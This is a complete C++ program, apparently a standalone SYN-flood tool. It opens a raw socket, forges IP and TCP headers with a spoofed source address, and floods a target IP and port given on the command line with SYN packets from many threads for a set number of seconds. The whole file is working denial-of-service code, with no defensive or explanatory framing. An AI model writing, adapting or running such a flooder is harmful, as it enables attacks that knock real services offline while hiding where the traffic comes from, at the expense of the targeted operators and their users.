#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <unistd.h>
#include <atomic>
#include <thread>
#include <vector>
#include <string>
#include <chrono>
#include <cstdlib>
#include <cstring>
#include <random>

static std::atomic<bool> g_running{false};

// TCP pseudo-header for checksum
struct pseudo_header {
    uint32_t source_address;
    uint32_t dest_address;
    uint8_t placeholder;
    uint8_t protocol;
    uint16_t tcp_length;
};

unsigned short csum(unsigned short *ptr, int nbytes) {
    long sum = 0;
    unsigned short oddbyte;
    short answer;
    while (nbytes > 1) { sum += *ptr++; nbytes -= 2; }
    if (nbytes == 1) { oddbyte = 0; *((u_char *)&oddbyte) = *(u_char *)ptr; sum += oddbyte; }
    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;
    return answer;
}

static void tcp_syn_thread(const std::string& ip, int port) {
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (s < 0) return;

    // Set IP_HDRINCL so we can write the IP header ourselves
    int one = 1;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) return;

    // Build the packet buffer
    char datagram[4096];
    memset(datagram, 0, 4096);

    struct iphdr *iph = (struct iphdr *)datagram;
    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));
    struct sockaddr_in sin;
    pseudo_header psh;

    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    sin.sin_addr.s_addr = inet_addr(ip.c_str());

    // IP Header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->id = htonl(54321);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->saddr = inet_addr("1.2.3.4"); // Spoofed source IP
    iph->daddr = sin.sin_addr.s_addr;

    // TCP Header
    tcph->source = htons(rand() % 65535);
    tcph->dest = htons(port);
    tcph->seq = rand();
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->fin = 0;
    tcph->syn = 1;
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->urg = 0;
    tcph->window = htons(5840);
    tcph->check = 0;
    tcph->urg_ptr = 0;

    // Checksum
    psh.source_address = inet_addr("1.2.3.4");
    psh.dest_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr));

    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
    char *pseudogram = (char *)malloc(psize);
    memcpy(pseudogram, (char *)&psh, sizeof(struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));

    tcph->check = csum((unsigned short *)pseudogram, psize);
    free(pseudogram);

    while (g_running) {
        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
    }
    close(s);
}

int main(int argc, char** argv) {
    if (argc < 5) return 1;
    std::string ip = argv[1];
    int port = atoi(argv[2]);
    int thr  = atoi(argv[3]);
    int dur  = atoi(argv[4]);

    g_running = true;
    std::vector<std::thread> pool;
    for (int i = 0; i < thr; i++) pool.emplace_back(tcp_syn_thread, ip, port);

    std::thread timer([dur]() {
        std::this_thread::sleep_for(std::chrono::seconds(dur));
        g_running = false;
    });

    for (auto& t : pool)  if (t.joinable()) t.join();
    if (timer.joinable()) timer.join();
    return 0;
}
